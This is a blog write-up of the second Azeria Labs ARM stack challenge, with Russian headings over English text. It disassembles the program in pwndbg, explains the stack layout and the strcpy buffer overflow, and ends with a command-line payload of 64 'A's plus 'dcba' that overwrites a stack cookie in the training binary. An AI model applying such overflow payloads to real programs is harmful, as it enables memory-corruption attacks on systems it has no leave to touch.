---
layout: post
title: "Smashing ARM Stack for Fun - Part II"
tags: [reversing, exploiting, ARM, iasm, azeria-labs]
inline_default_language: nasm
---

This is going to be a fast moving post, directly to the details,
about exploiting the [second Arm challenge](https://github.com/azeria-labs/ARM-challenges)<!--more-->


## Распределение стека

```nasm
 ► 0x104b0 <main>       push   {fp, lr}
   0x104b4 <main+4>     add    fp, sp, #4
   0x104b8 <main+8>     sub    sp, sp, #0x50
   0x104bc <main+12>    str    r0, [fp, #-0x50]
   0x104c0 <main+16>    str    r1, [fp, #-0x54]
```

0x58 bytes are allocated where 0x54 bytes belong to the current stack
frame.

The first two words are allocated by `push` and the rest by `sub`.

```python
100:00> ;! M[sp:]   # <-- from sp to the end of the mapped page
[
        --
        |   \xee\xee\xee\xee   == r1
        |   \xdd\xdd\xdd\xdd   == r0
  0x50  |   \x00\x00\x00\x00
        |   ... 16 more rows full of zeros ...
cookie -|-->\x00\x00\x00\x00
        --
   0x8  |   \xbb\xbb\xbb\xbb   == fp
 fp ----|-->\xaa\xaa\xaa\xaa   == lr
        --
] <-- base of stack
```

## Проверка аргументов

{% call marginnotes() %}
`errx`{.none} prints a message to the standard error output and then makes
the program exit.
<br />
See [man errx](https://linux.die.net/man/3/errx)
 {% endcall %}

`argc`{.none} is expected to be 1 otherwise the program will **not** jump
and `errx`{.none} will be called.

```nasm
   0x104c4 <main+20>    ldr    r3, [fp, #-0x50]
   0x104c8 <main+24>    cmp    r3, #1
   0x104cc <main+28>    bne    #main+44 <main+44>

   0x104d0 <main+32>    mov    r0, #1
   0x104d4 <main+36>    ldr    r1, [pc, #0x5c]
   0x104d8 <main+40>    bl     #errx@plt <errx@plt>

 ► 0x104dc <main+44>    mov    r3, #0
```

{% call marginnotes() %}
As mentioned in a [previous post](/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html),
when `pc` is used for indexing
the `pc` is the address of the current about-to-be-executed instruction
*plus* 8 bytes.
 {% endcall %}

Let's see  `ldr r1, [pc, #0x5c]` that translates to 0x104d4 + 0x5c + 0x8:

```nasm
pwndbg> x/1wx 0x10538
0x10538 <main+136>:     0x000105bc

pwndbg> x/1bs 0x000105bc
0x105bc:        "please specify an argument\n"
```

## Переполнение буфера

A cookie is stored in the stack with a value of zero. Then `argv`{.none}
is loaded into `r3` or `&argv[0]`{.cpp} if you want.

The `add` instruction moves `argv`{.none} pointer 4 bytes forward. In other
words, `r3` *points* to `argv[1]`{.cpp}.

Finally the pointer is dereferenced and `r3` *has* the `argv[1]`{.cpp}
pointer.

```nasm
 ► 0x104dc <main+44>    mov    r3, #0
   0x104e0 <main+48>    str    r3, [fp, #-8]
   0x104e4 <main+52>    ldr    r3, [fp, #-0x54]
   0x104e8 <main+56>    add    r3, r3, #4
   0x104ec <main+60>    ldr    r3, [r3]
```

Like in the [previous challenge](/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html),
begin of the buffer for `strcpy`{.cpp}
is 4 bytes below the pushed arguments and has a size of 64 bytes
(0x48 bytes minus 4 bytes for the pushed `fp` and 4 bytes for the
cookie)

```nasm
   0x104f0 <main+64>    sub    r2, fp, #0x48
```

```python
100:20> ;! M[sp:]
[
        --
        |   \xee\xee\xee\xee   == r1
        |   \xdd\xdd\xdd\xdd   == r0
  0x50  |   \x00\x00\x00\x00
buf ----|-->AAAA
        |   BBBB
        |   CCCC
        |   ... 13 more rows full of zeros ...
cookie -|-->\x00\x00\x00\x00
        --
   0x8  |   \xbb\xbb\xbb\xbb   == fp
 fp ----|-->\xaa\xaa\xaa\xaa   == lr
        --
]
```

Finally the call to `strcpy`{.cpp} is made:

```nasm
   0x104f4 <main+68>    mov    r0, r2
   0x104f8 <main+72>    mov    r1, r3
   0x104fc <main+76>    bl     #strcpy@plt <strcpy@plt>
```

## Сравнение

```nasm
 ► 0x10500 <main+80>     ldr    r3, [fp, #-8]
   0x10504 <main+84>     ldr    r2, [pc, #0x30]
   0x10508 <main+88>     cmp    r3, r2
   0x1050c <main+92>     bne    #main+108 <main+108>
```

The cookie is loaded from the stack and compared with the value
stored in the code segment at 0x10504 + 0x30 + 0x8:

```nasm
pwndbg> x/1wx 0x1053c
0x1053c <main+140>:     0x61626364
```

The good old `'abcd'`{.cpp} or `'dcba'`{.cpp} to be more precise due the endianess
of the machine.

A byte by byte inspection may make this more explicit:

```nasm
pwndbg> x/4bx 0x1053c
0x1053c <main+140>:     0x64    0x63    0x62    0x61
```


## Наша цель (branch at 0x1050c **not** taken):

```nasm
pwndbg> pdisass 0x10510
 ► 0x10510 <main+96>     ldr    r0, [pc, #0x28]
   0x10514 <main+100>    bl     #puts@plt <puts@plt>

   0x10518 <main+104>    b      #main+124 <main+124>

pwndbg> x/1wx 0x10540
0x10540 <main+144>:     0x000105d8

pwndbg> x/1bs 0x000105d8
0x105d8:        "you have correctly got the variable to the right value"
```

## Неудача (branch at 0x1050c **is** taken):

```nasm
pwndbg> pdisass &main+108 10
 ► 0x1051c <main+108>    ldr    r3, [fp, #-8]
   0x10520 <main+112>    ldr    r0, [pc, #0x1c]
   0x10524 <main+116>    mov    r1, r3
   0x10528 <main+120>    bl     #printf@plt <printf@plt>

pwndbg> x/1wx 0x10544
0x10544 <main+148>:     0x00010610

pwndbg> x/1bs 0x00010610
0x10610:        "Try again, you got 0x%08x\n"
```

## Эпилог

We reach here regardless of which path the branch at 0x1050c jumped to:

```nasm
pwndbg> pdisass &main+124
 ► 0x1052c <main+124>    mov    r0, r3
   0x10530 <main+128>    sub    sp, fp, #4
   0x10534 <main+132>    pop    {fp, pc}
```

## Атака

```shell
pi@raspberrypi:~$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```
